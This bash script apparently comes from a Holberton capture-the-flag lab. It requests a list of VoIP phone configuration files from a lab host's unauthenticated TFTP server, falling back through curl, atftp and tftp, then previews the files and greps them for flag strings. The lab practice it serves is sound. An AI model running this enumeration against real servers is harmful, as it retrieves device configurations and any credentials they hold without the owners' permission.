#!/usr/bin/env bash
set -euo pipefail

HOST="web0x04.hbtn"
PORT=69                # tftp default
OUTDIR="tftp_hits"
mkdir -p "$OUTDIR"

# Candidate filenames (edit / add more as needed)
files=(
  "infrared.txt"
  "OS79XX.TXT"
  "phbook00e011010455.txt"
  "sip_4602D01A.txt"
  "sip_4602D02A.txt"
  "uniden00e011030397.txt"
  "unidencom.txt"
)

# Helper: try curl (tftp://), then tftp client fallback
download_file() {
  local fn="$1"
  local out="$OUTDIR/$fn"

  # Remove any previous partial
  rm -f "$out"

  if command -v curl >/dev/null 2>&1; then
    # curl supports tftp://host/filename
    if curl --fail --silent --show-error "tftp://$HOST:$PORT/$fn" -o "$out"; then
      echo "[+] curl fetched $fn -> $out"
      return 0
    else
      rm -f "$out"
      echo "[-] curl failed for $fn"
    fi
  fi

  # Try atftp if present (non-interactive)
  if command -v atftp >/dev/null 2>&1; then
    if echo "get $fn" | atftp --verbose --host "$HOST" --port "$PORT" >/dev/null 2>&1; then
      # atftp saves into local directory with same name
      if [[ -f "$fn" ]]; then
        mv "$fn" "$out"
        echo "[+] atftp fetched $fn -> $out"
        return 0
      fi
    fi
    echo "[-] atftp failed for $fn"
  fi

  # Try classic tftp client (interactive-but-stdin)
  if command -v tftp >/dev/null 2>&1; then
    if printf "get %s %s\nquit\n" "$fn" "$out" | tftp "$HOST" "$PORT" >/dev/null 2>&1; then
      if [[ -s "$out" ]]; then
        echo "[+] tftp client fetched $fn -> $out"
        return 0
      fi
    fi
    echo "[-] tftp client failed for $fn"
  fi

  echo "[!] All methods failed for $fn"
  return 1
}

# Download loop
for f in "${files[@]}"; do
  echo "---- Trying: $f ----"
  download_file "$f" || true
done

# Quick triage: report which files exist and show previews
echo
echo "==== Triage of downloaded files in $OUTDIR ===="
shopt -s nullglob
found_any=false
for path in "$OUTDIR"/*; do
  found_any=true
  echo
  echo ">> File: $(basename "$path")"
  file "$path"
  echo "----- head (text preview, up to 200 lines or binary-safe) -----"
  # Show readable lines; prevent binary garbage flooding the terminal
  if head -n 200 "$path" | grep -q '[[:print:]]'; then
    head -n 200 "$path" || true
  else
    echo "(binary or no printable first 200 lines) — showing hexdump first 128 bytes:"
    head -c 128 "$path" | hexdump -C
  fi
  echo "----- Searching for flag patterns / 'flag' -----"
  # Common CTF flag formats and case-insensitive 'flag'
  grep -iE --color=always "Holberton\{[^}]+\}|FLAG\{[^}]+\}|flag\{[^}]+\}|flag" "$path" || true
  echo "----- Strings preview (first 100 matches) -----"
  strings "$path" | head -n 100 || true
done

if ! $found_any; then
  echo "[!] No files were downloaded into $OUTDIR — check connectivity, hostname/IP, or filename spelling."
fi

echo
echo "Done. Inspect $OUTDIR for saved files."
